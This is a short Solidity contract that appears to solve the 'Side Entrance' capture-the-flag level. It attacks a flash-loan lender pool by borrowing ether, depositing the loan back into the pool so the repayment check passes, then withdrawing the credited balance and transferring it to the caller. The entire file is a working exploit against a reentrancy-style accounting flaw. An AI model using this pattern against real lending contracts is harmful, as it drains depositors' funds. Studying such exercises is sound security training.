// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract AttackSideEntrance is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private pool;

    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
    }

    function attack(uint256 etherToSteal) external {
        pool.flashLoan(etherToSteal);

        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
